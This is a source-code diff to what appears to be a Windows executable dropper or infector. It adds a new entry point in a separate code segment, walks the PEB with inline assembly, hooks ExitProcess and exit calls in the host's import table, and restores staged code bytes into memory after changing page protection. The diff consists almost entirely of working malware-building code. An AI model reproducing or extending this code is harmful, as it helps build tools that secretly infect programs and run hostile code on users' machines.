@@ -7,6 +7,8 @@ using namespace std;
 #include <boost/filesystem.hpp>
 namespace bf = boost::filesystem;
 
+#include "../libs/AsmJit/AsmJit.h"
+
 #include "DropperCode.h"
 #include "XRefNames.h"
 #include "rc4.h"
@@ -130,6 +132,8 @@ char * _needed_strings[] = {
 	"VerifyVersionInfo @ %08x", // 25
 	"Sys MajorVersion %d", // 26
 	"Sys MinorVersion %d", // 27
+	"Restoring stage1 code", //28
+	"Restoring stage2 code", //29
 #endif
 
 	NULL
@@ -154,7 +158,7 @@ BYTE oepStub[OEPSTUBSIZE] = {
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
 int __stdcall NewEntryPoint()
-{	
+{
 	DWORD dwCurrentAddr = 0;
 	DWORD OEP = 0;
 	
@@ -192,12 +196,11 @@ int __stdcall NewEntryPoint()
 	DWORD **pPEB;
 	DWORD *Ldr;
 	
-	// *** get PEB
 	__asm {
-		MOV EAX,30h
-		MOV EAX,DWORD PTR FS:[EAX]
-		ADD EAX, 08h
-		MOV SS:[pPEB], EAX
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
 	}
 	
 	Ldr = *(pPEB + 1);
@@ -329,16 +332,15 @@ NEXT_ENTRY:
 	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
 	
 	DWORD imageBase = 0;
-	
 	__asm {
 		push eax
-			push ebx
-			mov eax, fs:[30h]
+		push ebx
+		mov eax, fs:[30h]
 		mov ebx, [eax+8]
 		mov imageBase, ebx
-			pop ebx
-			pop eax
-	}
+		pop ebx
+		pop eax
+	}		
 	
 	// loop IAT lookin for ExitProcess
 	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
@@ -500,11 +502,21 @@ NEXT_ENTRY:
 	// we can proceed even if hooking is not successful
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	if (pfn_HookCall && IAT_rva) {
-		if (pfn_ExitProcessHook)
-			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->exitProcessIndex, (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
+		if (pfn_ExitProcessHook) {
+			DWORD ret = -1;
+			ret = pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->hookedCalls.ExitProcess, (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
+			if (ret == 0)
+				MESSAGE(STRING(STRIDX_EXITPROCHOOKED));
+		}
+
 		if (pfn_ExitHook) {
-			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->_exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+			DWORD ret = -1;
+			ret = pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->hookedCalls.exit, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+			if (ret == 0)
+				MESSAGE(STRING(STRIDX_EXITHOOKED));
+			ret = pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->hookedCalls._exit, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+			if (ret == 0)
+				MESSAGE(STRING(STRIDX_EXITHOOKED));
 		}
 	}
 	
@@ -525,7 +537,32 @@ OEP_CALL:
 	//
 	// *** Restore OEP code
 	//
+
+	MESSAGE(STRING(STRIDX_RESTORESTAGE1));
+
+	if (header->stage1.size) {
+		DWORD oldProtect = 0;
+		char *code = (char*) ( ((char*)header) + header->stage1.offset );
+		size_t size = header->stage1.size;
+
+		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, PAGE_EXECUTE_READWRITE, &oldProtect );
+		_MEMCPY_( (char*) header->stage1.VA, code, size );
+		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, oldProtect, &oldProtect );
+	}
+
+	MESSAGE(STRING(STRIDX_RESTORESTAGE2));
 	
+	if (header->stage2.size) {
+		DWORD oldProtect = 0;
+		char *code = (char*) ( ((char*)header) + header->stage2.offset );
+		size_t size = header->stage2.size;
+		
+		pfn_VirtualProtect( (LPVOID) header->stage2.VA, size, PAGE_EXECUTE_READWRITE, &oldProtect );
+		_MEMCPY_( (char*) header->stage2.VA, code, size );
+		pfn_VirtualProtect( (LPVOID) header->stage2.VA, size, oldProtect, &oldProtect );
+	}
+	
+#if 0
 	OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 	
 	MESSAGE(STRING(STRIDX_RESTOREOEP));
@@ -543,14 +580,13 @@ OEP_CALL:
 	
 	MESSAGE(STRING(STRIDX_OEPRESTORED));
 	MESSAGE1(STRIDX_CALLINGOEP, OEP);
-	
-#if 0
-	__asm {
-		popad
-	}
 #endif
 	
-	((WINSTARTFUNC)OEP)();
+#if 0
+	// ((WINSTARTFUNC)OEP)();
+	WINSTARTFUNC pfn_OEP = (WINSTARTFUNC) (((char*)header) + header->restore.offset);
+	pfn_OEP();
+#endif
 	
 	return 0;
 }
@@ -819,7 +855,7 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 			CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
 			CHAR* dllName = (CHAR*) pfn_VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
 			if (dllName == NULL)
-				return 0;
+				return -1;
 			
 			_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);
 			
@@ -836,8 +872,8 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 				
 				IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);
 				
-				MESSAGE((PCHAR)name_import->Name);
-						
+				MESSAGE((PCHAR) name_import->Name);
+				
 				DWORD oldProtect = 0;
 				
 				MEMORY_BASIC_INFORMATION * mbi = 
@@ -857,9 +893,7 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 				
 				pfn_VirtualFree(mbi, 0, MEM_RELEASE);
 				
-				MESSAGE(STRING(STRIDX_EXITHOOKED));
-				
-				return true;
+				return 0;
 			}
 			
 			pfn_VirtualFree(dllName, 0, MEM_RELEASE);
@@ -868,7 +902,7 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 		}
 	}
 	
-	return false;
+	return -1;
 }
 FUNCTION_END(hookCall);
 
@@ -1006,7 +1040,7 @@ __forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD len
 		if ( ! _MEMCMP_(against + i, unicode + (i*2), 1))
 			return false;
 	}
-
+	
 	return true;
 }
 
@@ -1017,4 +1051,6 @@ bool dumpDropperFiles()
 		cout << "Cannot create directory " << dir << endl;
 		return false;
 	}
+
+	return true;
 }
